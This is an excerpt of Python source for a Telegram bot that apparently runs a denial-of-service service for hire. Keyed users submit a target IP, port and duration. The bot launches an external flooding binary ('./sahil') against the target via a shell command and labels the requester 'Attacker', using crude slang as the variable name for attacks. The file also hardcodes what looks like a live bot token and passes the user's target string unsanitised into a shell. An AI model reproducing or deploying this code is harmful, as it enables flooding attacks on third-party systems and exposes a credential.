...
bot = telebot.TeleBot('8134663359:AAGXJMr6WPFSXxk8lMdnNSCOWAryHOyOyLc')
...
MAX_chudai_TIME = 300  # Example: Default maximum chudai time set to 300 seconds
...
def create_random_key():
    key = "NUCLEAR-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
...
def bot_sitting(message):
    ...
    set_time_button = types.KeyboardButton("🕒 Set chudai Time")
...
@bot.message_handler(func=lambda message: message.text == "🕒 Set chudai Time")
def prompt_set_chudai_time(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return

    bot.reply_to(message, f"🕒 Enter the new maximum chudai time in seconds (current: {MAX_chudai_TIME}s):")
    bot.register_next_step_handler(message, process_set_chudai_time)

def process_set_chudai_time(message):
    global MAX_chudai_TIME
    user_id = str(message.chat.id)
    ...
    try:
        ...
        if new_time <= 0:
            ...
            MAX_chudai_TIME = new_time
            bot.reply_to(message, f"✅ Maximum chudai time updated to {MAX_chudai_TIME} seconds!")
    except ValueError:
...
COOLDOWN_PERIOD = 0  # 1-minute cooldown
...
def handle_chudai(message):
    ...
    if user_id in users and users[user_id]:  # Ensure user has valid expiration
        ...
        if user_id in last_chudai_time:
            time_since_last_chudai = (datetime.datetime.now() - last_chudai_time[user_id]).total_seconds()
            if time_since_last_chudai < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_chudai
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
                bot.reply_to(message, response)
                return  # Prevent the chudai from proceeding

        # Prompt the user for chudai details
...
def process_chudai_details(message):
    ...
    if len(details) == 3:
        ...
        try:
            port = int(details[1])
            chudai_time = int(details[2])  # ✅ Renamed from 'time' to 'chudai_time'

            if chudai_time > MAX_chudai_TIME:
                response = f"❗️ Error: Maximum allowed chudai time is {MAX_chudai_TIME} seconds!"
            else:
                # Log the chudai with correct variable name
                log_command(user_id, target, port, chudai_time)
                full_command = f"./sahil {target} {port} {chudai_time} {1450}"  # ✅ Correct variable name
                ...
                response = (
                    ...
                    f"𝗧𝗶𝗺𝗲: {chudai_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
                    f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
                )

                # Execute the chudai command
                subprocess.Popen(full_command, shell=True)

                # Schedule a message after the chudai duration
...
def send_chudai_finished_message(chat_id, message_id, target, port, chudai_time):
    """Notify the user that the chudai is finished in a bold and powerful way, with a reply to the chudai message."""
...
if __name__ == "__main__":
    ...
    while True:
        ...
        chudai_time = 60  # ✅ Renamed from `time` to avoid conflicts
